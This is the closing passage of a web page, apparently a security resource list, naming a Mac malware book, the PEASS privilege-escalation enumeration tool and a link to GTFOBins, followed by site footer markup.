<h4 id="wardle-patrick-the-art-of-mac-malware">Wardle, Patrick. The Art of Mac Malware</h4>
<h3 id="peass">PEASS</h3>
<p>Detect possible PE vectors on a W/L/M machine.</p>
<h3 id="gtfobins">GTFOBins</h3>
<p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>

</details>
  </div>
</article>
</div>
</div>

        </div>
      </div>
    </div>
    
  </div>

  <div class="sub-footer">
  <div class="container">
    <div class="row">
      <div class="col-12">
        <div class="sub-footer-inner">
          <ul>
            <li class="zerostatic"><a href="https://www.zerostatic.io">www.zerostatic.io</a></li>
            </ul>
        </div>
      </div>
    </div>
  </div>
</div>

  

  
  

  
  <script type="text/javascript" src="/js/scripts.min.302a6fc365d5139fb98cf60bdb8f715d96257ea189161d36c190ccfa8182e569.js"></script>
  

  
  
  
    
  


</body>

</html>
